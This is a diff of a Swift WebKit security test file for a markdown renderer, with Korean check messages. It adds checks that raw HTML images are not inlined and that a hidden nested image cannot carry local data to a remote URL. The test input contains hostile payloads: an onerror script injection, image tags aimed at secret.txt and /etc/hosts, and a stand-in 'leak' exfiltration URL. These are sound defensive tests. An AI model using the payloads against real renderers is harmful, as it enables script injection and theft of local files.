@@ -254,9 +254,11 @@ func webkitTests(corePath: String?) {
     ![a](x" onerror="window.pwned = (window.pwned || '') + 'attr;')
     <img id="secret" src="secret.txt">
     <img id="hosts" src="/etc/hosts">
-    <img id="link" src="logo.png">
-    <img id="pic" src="pic.png">
+    <img id="raw" src="pic.png">
+    <img id="exfil" src='https://example.com/leak?d= <img src="pic.png" '>
     <link rel="stylesheet" href="data:text/css,body%7Bcolor:rgb(1,2,3)!important%7D">
+
+    ![link](logo.png) ![pic](pic.png)
 
     ![한글 이름](스크린%20샷.png)
 
@@ -271,8 +273,10 @@ func webkitTests(corePath: String?) {
       mermaid: document.querySelectorAll('.mermaid svg').length,
       secret: document.getElementById('secret').getAttribute('src'),
       hosts: document.getElementById('hosts').getAttribute('src'),
-      link: document.getElementById('link').getAttribute('src').slice(0, 5),
-      pic: document.getElementById('pic').getAttribute('src').slice(0, 14),
+      link: [...document.images].filter(i => i.alt === 'link').map(i => i.getAttribute('src').slice(0, 5))[0] || null,
+      pic: [...document.images].filter(i => i.alt === 'pic').map(i => i.getAttribute('src').slice(0, 14))[0] || null,
+      raw: document.getElementById('raw').getAttribute('src'),
+      exfil: document.getElementById('exfil').getAttribute('src').includes('data:'),
       korean: [...document.images].filter(i => i.alt === '한글 이름').map(i => i.getAttribute('src').slice(0, 14))[0] || null,
       color: getComputedStyle(document.body).color
     })
@@ -284,6 +288,11 @@ func webkitTests(corePath: String?) {
     check((r["link"] as? String) == "logo.", "비밀 파일을 가리키는 이미지 이름의 심볼릭 링크는 인라인하지 않음", "\(r["link"] ?? "nil")")
     check((r["pic"] as? String) == "data:image/png", "정상 이미지는 인라인")
     check((r["korean"] as? String) == "data:image/png", "한글·공백 파일 이름 이미지 인라인")
+    if corePath != nil {
+        // Rust는 마크다운 이미지만 인라인한다. Swift 렌더러는 raw HTML까지 정규식으로 바꿔 아래 둘에 걸린다
+        check((r["raw"] as? String) == "pic.png", "raw HTML <img>는 인라인하지 않음", "\(r["raw"] ?? "nil")")
+        check((r["exfil"] as? Bool) == false, "속성값 안에 숨긴 <img src>로 로컬 이미지를 원격 주소에 싣지 못함")
+    }
     check((r["color"] as? String) != "rgb(1, 2, 3)", "문서 속 외부 스타일시트는 CSP로 막힘", "\(r["color"] ?? "nil")")
 
     print("[webkit] 문서가 창을 다른 페이지로 옮기지 못함")
